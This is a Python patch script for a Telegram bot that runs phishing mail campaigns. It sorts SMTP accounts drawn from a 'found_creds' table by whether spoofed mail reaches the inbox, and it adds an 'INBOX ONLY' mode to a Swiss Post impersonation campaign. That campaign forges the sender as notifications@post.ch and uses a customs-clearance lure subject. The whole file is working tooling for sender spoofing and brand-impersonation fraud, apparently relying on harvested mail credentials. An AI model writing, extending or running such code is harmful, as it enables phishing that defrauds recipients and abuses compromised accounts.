#!/usr/bin/env python3
"""
Patch: 4-category SMTP classification (SPOOF_INBOX, SPOOF_SPAM, BASIQUE_INBOX, BASIQUE_SPAM, AUTRE)
Updates: _classify_smtp, _format_smtp_detail, _kb_smtp_select, _kb_smtp_list, smtp_list display,
         camp_new, camp_swisspost
"""

TARGET = "/opt/darkvasend/auditguard/sender_bot.py"

with open(TARGET, "r") as f:
    content = f.read()

# 1. Replace _classify_smtp
OLD_CLASSIFY = '''def _classify_smtp(s: dict) -> str:
    """Classify SMTP as SPOOF, BASIQUE, or AUTRE based on context."""
    ctx = (s.get("context") or "")
    if "SPOOF_" in ctx and "BASIQUE" not in ctx:
        return "SPOOF"
    elif "BASIQUE_" in ctx:
        return "BASIQUE"
    return "AUTRE"'''

NEW_CLASSIFY = '''def _classify_smtp(s: dict) -> str:
    """Classify SMTP into 5 categories based on context field."""
    ctx = (s.get("context") or "")
    if "SPOOF_INBOX_" in ctx:
        return "SPOOF_INBOX"
    elif "SPOOF_SPAM_" in ctx or ("SPOOF_" in ctx and "BASIQUE" not in ctx and "INBOX" not in ctx):
        return "SPOOF_SPAM"
    elif "BASIQUE_INBOX_" in ctx:
        return "BASIQUE_INBOX"
    elif "BASIQUE_SPAM_" in ctx or ("BASIQUE_" in ctx and "INBOX" not in ctx):
        return "BASIQUE_SPAM"
    return "AUTRE"


# Category display config: (label_prefix, header_emoji, header_text)
_CAT_CONFIG = {
    "SPOOF_INBOX": ("SI", "SPOOF INBOX"),
    "SPOOF_SPAM":  ("SS", "SPOOF SPAM"),
    "BASIQUE_INBOX": ("BI", "BASIQUE INBOX"),
    "BASIQUE_SPAM":  ("BS", "BASIQUE SPAM"),
    "AUTRE":       ("", "AUTRE"),
}
_CAT_ORDER = ["SPOOF_INBOX", "SPOOF_SPAM", "BASIQUE_INBOX", "BASIQUE_SPAM", "AUTRE"]'''

content = content.replace(OLD_CLASSIFY, NEW_CLASSIFY)

# 2. Replace _format_smtp_detail category detection
OLD_DETAIL_CAT = '''    # Detect category
    cat = "AUTRE"
    if "SPOOF_" in context and "BASIQUE" not in context:
        cat = "SPOOF"
    elif "BASIQUE_" in context:
        cat = "BASIQUE"
    
    cat_line = f"Categorie: {cat}\\n" if cat != "AUTRE" else ""'''

NEW_DETAIL_CAT = '''    # Detect category
    cat = _classify_smtp(smtp)
    cat_line = f"Categorie: {cat}\\n"'''

content = content.replace(OLD_DETAIL_CAT, NEW_DETAIL_CAT)

# 3. Replace _kb_smtp_select
OLD_KB_SELECT = '''def _kb_smtp_select(smtp_list: list[dict], callback_prefix: str, callback_suffix: str = "", back_data: str = "back_main") -> InlineKeyboardMarkup:
    """Build a classified SMTP selection keyboard for templates/campaigns/spoof test.
    
    Each button shows: S PROV N (SPOOF) or B PROV N (BASIQUE) or PROV N (AUTRE)
    callback_data = f"{callback_prefix}{cred_id}{callback_suffix}"
    """
    buttons = []

    spoof = [s for s in smtp_list if _classify_smtp(s) == "SPOOF"]
    basique = [s for s in smtp_list if _classify_smtp(s) == "BASIQUE"]
    autre = [s for s in smtp_list if _classify_smtp(s) == "AUTRE"]

    if spoof:
        buttons.append([InlineKeyboardButton(
            f"--- SPOOF ({len(spoof)}) ---", callback_data="noop"
        )])
        row = []
        for i, cred in enumerate(spoof, 1):
            prov = (cred.get("provider") or "smtp").upper()
            label = f"S {prov} {i}"
            row.append(InlineKeyboardButton(label, callback_data=f"{callback_prefix}{cred['id']}{callback_suffix}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)

    if basique:
        buttons.append([InlineKeyboardButton(
            f"--- BASIQUE ({len(basique)}) ---", callback_data="noop"
        )])
        row = []
        for i, cred in enumerate(basique, 1):
            prov = (cred.get("provider") or "smtp").upper()
            label = f"B {prov} {i}"
            row.append(InlineKeyboardButton(label, callback_data=f"{callback_prefix}{cred['id']}{callback_suffix}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)

    if autre:
        buttons.append([InlineKeyboardButton(
            f"--- AUTRE ({len(autre)}) ---", callback_data="noop"
        )])
        row = []
        for i, cred in enumerate(autre, 1):
            prov = (cred.get("provider") or "smtp").upper()
            label = f"{prov} {i}"
            row.append(InlineKeyboardButton(label, callback_data=f"{callback_prefix}{cred['id']}{callback_suffix}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)

    buttons.append([InlineKeyboardButton("Retour", callback_data=back_data)])
    return InlineKeyboardMarkup(buttons)'''

NEW_KB_SELECT = '''def _kb_smtp_select(smtp_list: list[dict], callback_prefix: str, callback_suffix: str = "", back_data: str = "back_main") -> InlineKeyboardMarkup:
    """Build a classified SMTP selection keyboard with 5 categories."""
    buttons = []

    grouped = {}
    for cat in _CAT_ORDER:
        grouped[cat] = [s for s in smtp_list if _classify_smtp(s) == cat]

    for cat in _CAT_ORDER:
        items = grouped[cat]
        if not items:
            continue
        prefix_lbl, header = _CAT_CONFIG[cat]
        buttons.append([InlineKeyboardButton(
            f"--- {header} ({len(items)}) ---", callback_data="noop"
        )])
        row = []
        for i, cred in enumerate(items, 1):
            prov = (cred.get("provider") or "smtp").upper()
            label = f"{prefix_lbl} {prov} {i}" if prefix_lbl else f"{prov} {i}"
            row.append(InlineKeyboardButton(label, callback_data=f"{callback_prefix}{cred['id']}{callback_suffix}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)

    buttons.append([InlineKeyboardButton("Retour", callback_data=back_data)])
    return InlineKeyboardMarkup(buttons)'''

content = content.replace(OLD_KB_SELECT, NEW_KB_SELECT)

# 4. Replace _kb_smtp_list
OLD_KB_LIST = '''def _kb_smtp_list(smtp_list: list[dict]) -> InlineKeyboardMarkup:
    """Build keyboard with SMTP grouped by category: SPOOF / BASIQUE / AUTRE."""
    buttons = []

    # Classify into categories
    spoof = [s for s in smtp_list if _classify_smtp(s) == "SPOOF"]
    basique = [s for s in smtp_list if _classify_smtp(s) == "BASIQUE"]
    autre = [s for s in smtp_list if _classify_smtp(s) == "AUTRE"]

    # --- SPOOF section ---
    if spoof:
        buttons.append([InlineKeyboardButton(
            f"--- SPOOF ({len(spoof)}) ---", callback_data="noop"
        )])
        row = []
        for i, cred in enumerate(spoof, 1):
            prov = (cred.get("provider") or "smtp").upper()
            label = f"S {prov} {i}"
            row.append(InlineKeyboardButton(label, callback_data=f"smtp_view_{cred['id']}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)

    # --- BASIQUE section ---
    if basique:
        buttons.append([InlineKeyboardButton(
            f"--- BASIQUE ({len(basique)}) ---", callback_data="noop"
        )])
        row = []
        for i, cred in enumerate(basique, 1):
            prov = (cred.get("provider") or "smtp").upper()
            label = f"B {prov} {i}"
            row.append(InlineKeyboardButton(label, callback_data=f"smtp_view_{cred['id']}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)

    # --- AUTRE section ---
    if autre:
        buttons.append([InlineKeyboardButton(
            f"--- AUTRE ({len(autre)}) ---", callback_data="noop"
        )])
        row = []
        for i, cred in enumerate(autre, 1):
            prov = (cred.get("provider") or "smtp").upper()
            label = f"{prov} {i}"
            row.append(InlineKeyboardButton(label, callback_data=f"smtp_view_{cred['id']}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)

    buttons.append([
        InlineKeyboardButton("ADD SMTP", callback_data="add_smtp"),
        InlineKeyboardButton("Retour", callback_data="back_main"),
    ])
    return InlineKeyboardMarkup(buttons)'''

NEW_KB_LIST = '''def _kb_smtp_list(smtp_list: list[dict]) -> InlineKeyboardMarkup:
    """Build keyboard with SMTP grouped by 5 categories."""
    buttons = []

    grouped = {}
    for cat in _CAT_ORDER:
        grouped[cat] = [s for s in smtp_list if _classify_smtp(s) == cat]

    for cat in _CAT_ORDER:
        items = grouped[cat]
        if not items:
            continue
        prefix_lbl, header = _CAT_CONFIG[cat]
        buttons.append([InlineKeyboardButton(
            f"--- {header} ({len(items)}) ---", callback_data="noop"
        )])
        row = []
        for i, cred in enumerate(items, 1):
            prov = (cred.get("provider") or "smtp").upper()
            label = f"{prefix_lbl} {prov} {i}" if prefix_lbl else f"{prov} {i}"
            row.append(InlineKeyboardButton(label, callback_data=f"smtp_view_{cred['id']}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)

    buttons.append([
        InlineKeyboardButton("ADD SMTP", callback_data="add_smtp"),
        InlineKeyboardButton("Retour", callback_data="back_main"),
    ])
    return InlineKeyboardMarkup(buttons)'''

content = content.replace(OLD_KB_LIST, NEW_KB_LIST)

# 5. Replace smtp_list display (MES SMTP) — update text
OLD_SMTP_DISPLAY = '''        # Classify by label prefix
        spoof_list = [s for s in smtp_list if (s.get("context") or "").startswith("Manual: SPOOF_")]
        basique_list = [s for s in smtp_list if (s.get("context") or "").startswith("Manual: BASIQUE_")]
        other_list = [s for s in smtp_list if s not in spoof_list and s not in basique_list]
        
        lines = [
            "=============================",
            "  MES SMTP (AUTH OK)",
            "=============================",
            "",
        ]
        
        if spoof_list:
            lines.append(f"SMTP SPOOF: {len(spoof_list)}")
            lines.append("  (From complet fake — inbox)")
        if basique_list:
            lines.append(f"SMTP BASIQUE: {len(basique_list)}")
            lines.append("  (brand@domaine_smtp — inbox)")
        if other_list:
            lines.append(f"AUTRES: {len(other_list)}")
        
        lines.append(f"\\nTOTAL: {len(smtp_list)}")
        lines.append("\\nChoisis un SMTP:")'''

NEW_SMTP_DISPLAY = '''        grouped = {}
        for cat in _CAT_ORDER:
            grouped[cat] = [s for s in smtp_list if _classify_smtp(s) == cat]
        
        lines = [
            "=============================",
            "  MES SMTP (AUTH OK)",
            "=============================",
            "",
        ]
        
        if grouped["SPOOF_INBOX"]:
            lines.append(f"SPOOF INBOX: {len(grouped['SPOOF_INBOX'])}")
        if grouped["SPOOF_SPAM"]:
            lines.append(f"SPOOF SPAM: {len(grouped['SPOOF_SPAM'])}")
        if grouped["BASIQUE_INBOX"]:
            lines.append(f"BASIQUE INBOX: {len(grouped['BASIQUE_INBOX'])}")
        if grouped["BASIQUE_SPAM"]:
            lines.append(f"BASIQUE SPAM: {len(grouped['BASIQUE_SPAM'])}")
        if grouped["AUTRE"]:
            lines.append(f"AUTRES: {len(grouped['AUTRE'])}")
        
        lines.append(f"\\nTOTAL: {len(smtp_list)}")
        lines.append("\\nChoisis un SMTP:")'''

content = content.replace(OLD_SMTP_DISPLAY, NEW_SMTP_DISPLAY)

# 6. Replace camp_swisspost SMTP count display
OLD_CSP_COUNTS = '''        spoof_smtp = [s for s in smtp_list if _classify_smtp(s) == "SPOOF"]
        basique_smtp = [s for s in smtp_list if _classify_smtp(s) == "BASIQUE"]
        autre_smtp = [s for s in smtp_list if _classify_smtp(s) == "AUTRE"]
        all_c = len(smtp_list)
        sp_c = len(spoof_smtp)
        ba_c = len(basique_smtp)
        au_c = len(autre_smtp)
        buttons = [
            [InlineKeyboardButton("SPOOF ONLY (" + str(sp_c + au_c) + " SMTP)", callback_data="csp_mode_spoof")],
            [InlineKeyboardButton("SPOOF + BASIQUE (" + str(all_c) + " SMTP)", callback_data="csp_mode_both")],
            [InlineKeyboardButton("Retour", callback_data="back_main")],
        ]
        return await query.edit_message_text(
            "CAMPAGNE SWISS POST\\n\\n"
            "Template: Post CH SA\\n"
            "From: Post CH SA <notifications@post.ch>\\n"
            "Subject: Votre envoi est en cours de dedouanement\\n\\n"
            "SMTP SPOOF: " + str(sp_c) + "\\n"
            "SMTP BASIQUE: " + str(ba_c) + "\\n"
            "SMTP AUTRE: " + str(au_c) + "\\n\\n"
            "SPOOF = From complet fake (notifications@post.ch)\\n"
            "BASIQUE = swisspost@domaine_du_smtp\\n\\n"
            "Choisis le mode:",
            reply_markup=InlineKeyboardMarkup(buttons),
        )'''

NEW_CSP_COUNTS = '''        grouped = {}
        for cat in _CAT_ORDER:
            grouped[cat] = [s for s in smtp_list if _classify_smtp(s) == cat]
        si_c = len(grouped["SPOOF_INBOX"])
        ss_c = len(grouped["SPOOF_SPAM"])
        bi_c = len(grouped["BASIQUE_INBOX"])
        bs_c = len(grouped["BASIQUE_SPAM"])
        au_c = len(grouped["AUTRE"])
        all_spoof = si_c + ss_c + au_c
        all_c = len(smtp_list)
        buttons = [
            [InlineKeyboardButton("SPOOF ONLY (" + str(all_spoof) + " SMTP)", callback_data="csp_mode_spoof")],
            [InlineKeyboardButton("SPOOF + BASIQUE (" + str(all_c) + " SMTP)", callback_data="csp_mode_both")],
            [InlineKeyboardButton("INBOX ONLY (" + str(si_c + bi_c) + " SMTP)", callback_data="csp_mode_inbox")],
            [InlineKeyboardButton("Retour", callback_data="back_main")],
        ]
        return await query.edit_message_text(
            "CAMPAGNE SWISS POST\\n\\n"
            "Template: Post CH SA\\n"
            "From: Post CH SA <notifications@post.ch>\\n"
            "Subject: Votre envoi est en cours de dedouanement\\n\\n"
            "SPOOF INBOX: " + str(si_c) + "\\n"
            "SPOOF SPAM: " + str(ss_c) + "\\n"
            "BASIQUE INBOX: " + str(bi_c) + "\\n"
            "BASIQUE SPAM: " + str(bs_c) + "\\n"
            "AUTRE: " + str(au_c) + "\\n\\n"
            "SPOOF = From complet fake\\n"
            "BASIQUE = swisspost@domaine_smtp\\n"
            "INBOX = arrive en inbox\\n\\n"
            "Choisis le mode:",
            reply_markup=InlineKeyboardMarkup(buttons),
        )'''

content = content.replace(OLD_CSP_COUNTS, NEW_CSP_COUNTS)

# 7. Replace camp_new SMTP classification buttons
OLD_CAMP_NEW_CLASSIFY = '''        # Classified SMTP buttons
        spoof = [s for s in smtp_list if _classify_smtp(s) == "SPOOF"]
        basique = [s for s in smtp_list if _classify_smtp(s) == "BASIQUE"]
        autre = [s for s in smtp_list if _classify_smtp(s) == "AUTRE"]

        if spoof:
            buttons.append([InlineKeyboardButton(
                f"--- SPOOF ({len(spoof)}) ---", callback_data="noop"
            )])
            row = []
            for i, cred in enumerate(spoof, 1):
                prov = (cred.get("provider") or "smtp").upper()
                label = f"S {prov} {i}"
                row.append(InlineKeyboardButton(label, callback_data=f"camp_with_{cred['id']}"))
                if len(row) == 3:
                    buttons.append(row)
                    row = []
            if row:
                buttons.append(row)

        if basique:
            buttons.append([InlineKeyboardButton(
                f"--- BASIQUE ({len(basique)}) ---", callback_data="noop"
            )])
            row = []
            for i, cred in enumerate(basique, 1):
                prov = (cred.get("provider") or "smtp").upper()
                label = f"B {prov} {i}"
                row.append(InlineKeyboardButton(label, callback_data=f"camp_with_{cred['id']}"))
                if len(row) == 3:
                    buttons.append(row)
                    row = []
            if row:
                buttons.append(row)

        if autre:
            buttons.append([InlineKeyboardButton(
                f"--- AUTRE ({len(autre)}) ---", callback_data="noop"
            )])
            row = []
            for i, cred in enumerate(autre, 1):
                prov = (cred.get("provider") or "smtp").upper()
                label = f"{prov} {i}"
                row.append(InlineKeyboardButton(label, callback_data=f"camp_with_{cred['id']}"))
                if len(row) == 3:
                    buttons.append(row)
                    row = []
            if row:
                buttons.append(row)'''

NEW_CAMP_NEW_CLASSIFY = '''        # Classified SMTP buttons (5 categories)
        grouped = {}
        for cat in _CAT_ORDER:
            grouped[cat] = [s for s in smtp_list if _classify_smtp(s) == cat]

        for cat in _CAT_ORDER:
            items = grouped[cat]
            if not items:
                continue
            prefix_lbl, header = _CAT_CONFIG[cat]
            buttons.append([InlineKeyboardButton(
                f"--- {header} ({len(items)}) ---", callback_data="noop"
            )])
            row = []
            for i, cred in enumerate(items, 1):
                prov = (cred.get("provider") or "smtp").upper()
                label = f"{prefix_lbl} {prov} {i}" if prefix_lbl else f"{prov} {i}"
                row.append(InlineKeyboardButton(label, callback_data=f"camp_with_{cred['id']}"))
                if len(row) == 3:
                    buttons.append(row)
                    row = []
            if row:
                buttons.append(row)'''

content = content.replace(OLD_CAMP_NEW_CLASSIFY, NEW_CAMP_NEW_CLASSIFY)

# 8. Handle csp_mode_inbox in callbacks — add after csp_mode_ handler
# The existing handler starts with: if data.startswith("csp_mode_"):
# We need to handle mode="inbox" in the campaign runner
# The _run_swisspost_campaign already uses mode param, we just need to filter SMTPs

# Add inbox mode SMTP filtering in _run_swisspost_campaign
OLD_CSP_SMTP_FILTER = '''    smtp_list = mgr.get_smtp_for_campaign(campaign_id)
    if not smtp_list:
        send_telegram("CAMP #" + str(campaign_id) + ": aucun SMTP", chat_id)
        mgr.close()
        return

    mgr.update_campaign_status(campaign_id, "running")'''

NEW_CSP_SMTP_FILTER = '''    smtp_list = mgr.get_smtp_for_campaign(campaign_id)
    if not smtp_list:
        send_telegram("CAMP #" + str(campaign_id) + ": aucun SMTP", chat_id)
        mgr.close()
        return

    # Filter SMTPs based on mode
    if mode == "inbox":
        # Only use INBOX-classified SMTPs (SPOOF_INBOX + BASIQUE_INBOX)
        import sqlite3 as _sql
        _db = _sql.connect(db_path, timeout=10)
        _db.row_factory = _sql.Row
        _inbox_ids = set()
        for row in _db.execute("SELECT id, context FROM found_creds WHERE auth_ok=1").fetchall():
            ctx = row["context"] or ""
            if "INBOX_" in ctx:
                _inbox_ids.add(row["id"])
        _db.close()
        smtp_list = [s for s in smtp_list if s["cred_id"] in _inbox_ids]
        if not smtp_list:
            send_telegram("CAMP #" + str(campaign_id) + ": aucun SMTP INBOX disponible", chat_id)
            mgr.close()
            return

    mgr.update_campaign_status(campaign_id, "running")'''

content = content.replace(OLD_CSP_SMTP_FILTER, NEW_CSP_SMTP_FILTER)

# Write the patched file
with open(TARGET, "w") as f:
    f.write(content)

print("4-CATEGORY PATCH APPLIED OK")
print("Categories: SPOOF_INBOX, SPOOF_SPAM, BASIQUE_INBOX, BASIQUE_SPAM, AUTRE")
print("New campaign mode: INBOX ONLY (uses only INBOX-classified SMTPs)")
